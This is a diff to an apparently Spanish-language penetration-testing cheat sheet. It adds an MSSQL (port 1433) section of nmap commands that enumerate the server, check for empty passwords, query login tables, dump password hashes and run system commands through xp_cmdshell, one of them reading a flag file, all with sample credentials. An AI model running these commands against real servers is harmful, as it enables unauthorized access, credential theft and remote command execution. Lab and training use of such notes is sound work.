@@ -133,3 +133,23 @@ Lista de palabras para ataques de fuerza bruta
 ```python
 /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 ```
+
+### MSSQL - 1433
+Microsoft SQL Server (MSSQL) es un sistema de gestión de bases de datos relacionales desarrollado por Microsoft. Opera en el puerto 1433, facilitando la comunicación entre aplicaciones y bases de datos, permitiendo el almacenamiento y acceso a datos estructurados, con énfasis en la integración con el ecosistema de Microsoft.
+
+```python
+nmap --script ms-sql-info -p 1433 IP
+nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 IP
+nmap -p 1433 --script ms-sql-empty-password IP
+nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" IP -oN output.txt
+nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria IP
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" IP
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" IP
+```
+
+#### Diccionarios
+Lista de palabras para ataques de fuerza bruta
+
+```python
+No hay en este caso
+```
